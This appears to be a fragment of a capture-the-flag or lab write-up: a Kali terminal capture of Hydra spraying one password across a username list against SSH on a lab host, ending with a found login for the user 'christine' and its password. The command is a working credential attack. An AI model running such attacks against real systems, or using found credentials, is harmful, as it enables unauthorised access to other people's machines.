
```sh
┌──(fixit42㉿kali)-[~]
└─$ hydra -L funnelusers.txt -p 'funnel123#!#' ssh://10.129.1.73
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-04 23:02:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.129.1.73:22/
[22][ssh] host: 10.129.1.73   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-04 23:02:05
```

login: christine
password: funnel123#!#
